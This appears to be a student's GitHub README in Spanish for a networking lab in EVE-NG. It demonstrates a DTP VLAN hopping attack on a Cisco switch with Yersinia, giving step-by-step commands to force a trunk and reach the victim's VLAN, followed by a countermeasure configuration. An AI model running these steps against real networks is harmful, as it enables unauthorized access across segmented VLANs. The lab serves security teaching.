# DTP VLAN Hopping Attack — Networking Lab

**Estudiante:** Roger Rodriguez  
**Matricula:** 20250757  
**Fecha:** 12 de junio de 2026  

Link: https://youtu.be/qO7KD88EJac
---

## Descripcion del Ataque

El **DTP VLAN Hopping** explota el protocolo **Dynamic Trunking Protocol (DTP)** de Cisco. Un atacante envia tramas DTP falsas para convertir un puerto de acceso en trunk, logrando acceso no autorizado a VLANs restringidas.

---

## Topologia

```
Cloud0(SSH)
    |
   eth1
    |
 [Kali Linux]          [Ubuntu Victima]
 25.7.10.10             25.7.20.20
   eth0                   ens3
    |                      |
   fa1/0                 fa1/2
    |                      |
   [SW1 - CiscoIOL L2]----+
         |
        fa1/1 (trunk)
         |
       fa0/0
         |
      [R1 - 3725]
   fa0/0.10: 25.7.10.1
   fa0/0.20: 25.7.20.1
```

### Direccionamiento IP

| Dispositivo | IP | VLAN | Mascara | Gateway |
|---|---|---|---|---|
| Kali Linux | 25.7.10.10 | VLAN 10 | /24 | 25.7.10.1 |
| Ubuntu Victima | 25.7.20.20 | VLAN 20 | /24 | 25.7.20.1 |
| R1 fa0/0.10 | 25.7.10.1 | VLAN 10 | /24 | — |
| R1 fa0/0.20 | 25.7.20.1 | VLAN 20 | /24 | — |

---

## Herramientas Utilizadas

| Herramienta | Version | Uso |
|---|---|---|
| Yersinia | 0.8.2 | Envio de tramas DTP falsas |
| EVE-NG | Community | Plataforma de emulacion |
| Kali Linux | 2026.1 | Sistema atacante |
| Ubuntu Server | 22.04 | Sistema victima |

---

## Requisitos

- Kali Linux con Yersinia instalado (`sudo apt install yersinia -y`)
- Puerto del switch en modo `dynamic auto` o `dynamic desirable`
- Privilegios de root
- Interfaz en modo promiscuo

---

## Ejecucion del Ataque

### Paso 1 — Preparar Kali
```bash
sudo ip link set eth0 promisc on
```

### Paso 2 — Lanzar ataque DTP
```bash
sudo yersinia dtp -attack 1 -interface eth0
```

### Paso 3 — Verificar trunk en SW1
```cisco
show interfaces fa1/0 trunk
```

### Paso 4 — Saltar a VLAN 20
```bash
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link set eth0.20 up
sudo ip addr add 25.7.20.100/24 dev eth0.20
ping -c 3 25.7.20.20
```

### Script completo
```bash
sudo bash scripts/dtp_attack.sh
```

---

## Contra-Medida

```cisco
SW1(config)# interface fa1/0
SW1(config-if)# switchport mode access
SW1(config-if)# switchport access vlan 10
SW1(config-if)# no shutdown
SW1(config-if)# end
SW1# write memory
```

Verificacion:
```cisco
SW1# show interfaces fa1/0 switchport
```
Resultado: `Administrative Mode: static access` — DTP deshabilitado.

---

## Archivos del Repositorio

```
DTP-VLAN-Hopping-20250757/
├── README.md
├── scripts/
│   └── dtp_attack.sh
├── docs/
│   └── DTP_VLAN_Hopping_Roger_Rodriguez_20250757.docx
└── capturas/
    ├── 01_topologia.png
    ├── 02_yersinia_ataque.png
    ├── 03_puerto_trunk.png
    └── 04_ping_exitoso.png
```

---

## Video Demostracion

> Link del video en YouTube: https://youtu.be/qO7KD88EJac

---

## Capturas del Laboratorio

### Topologia en EVE-NG | <img width="776" height="322" alt="image" src="https://github.com/user-attachments/assets/01a1942f-dfff-456e-b7da-d12540a903ec" />
 |


### Yersinia ejecutando el ataque DTP |<img width="324" height="301" alt="image" src="https://github.com/user-attachments/assets/18d9702e-30d2-40a3-86b4-5995ed23bd13" />
|

### Puerto convertido a trunk en SW1 |<img width="370" height="227" alt="image" src="https://github.com/user-attachments/assets/b6b7c346-d6c0-4568-9245-5e31fcc7a6d8" />
|


---

*Roger Rodriguez | Matricula: 20250757 | Networking — EVE-NG | Junio 2026*
